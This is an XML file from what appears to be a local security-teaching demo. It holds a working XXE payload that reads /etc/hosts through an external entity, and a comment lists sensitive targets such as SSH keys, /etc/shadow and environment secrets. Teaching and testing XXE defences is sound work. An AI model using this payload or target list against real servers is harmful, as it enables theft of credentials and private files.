<?xml version="1.0" encoding="UTF-8"?>
<!--
  XXE ATTACK FILE #2 - Arbitrary File Read via XXE
  ==================================================
  This payload reads /etc/hosts to demonstrate that XXE can exfiltrate
  any file the server process has permission to read.

  In a real attack, the attacker would target:
  - /proc/self/environ  (environment variables, often contains secrets)
  - .env or config.py   (app credentials, JWT secrets, DB passwords)
  - ~/.ssh/id_rsa       (private SSH keys)
  - /etc/shadow         (hashed passwords, if the process runs as root)

  The key point: the attacker only needs to know (or guess) the path.
  The server reads the file and returns its contents in the response.

  See the home page at http://localhost:8000 for the curl and PowerShell commands.
-->
<!DOCTYPE foo [
  <!ENTITY secret SYSTEM "file:///etc/hosts">
]>
<!-- NOTE: /etc/hosts is Unix only. For a cross-platform demo using fake
     credentials (no real secrets), see the home page at http://localhost:8000
     for the curl / PowerShell commands using ?demo=secrets (POST required). -->
<item>
  <name>Secrets</name>
  <description>&secret;</description>
</item>
